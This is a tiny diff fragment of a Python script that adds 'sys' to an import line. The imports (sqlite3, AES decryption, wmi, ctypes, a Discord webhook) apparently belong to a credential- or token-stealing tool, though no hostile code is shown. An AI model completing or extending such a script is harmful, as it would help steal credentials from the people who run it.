@@ -1,4 +1,4 @@
-import base64,json,os,re,requests,subprocess,shutil,sqlite3,ctypes,wmi,time,uuid,psutil
+import base64,json,os,re,requests,subprocess,shutil,sqlite3,ctypes,wmi,time,uuid,psutil,sys
 
 from Crypto.Cipher import AES
 from discord import Embed, File, SyncWebhook
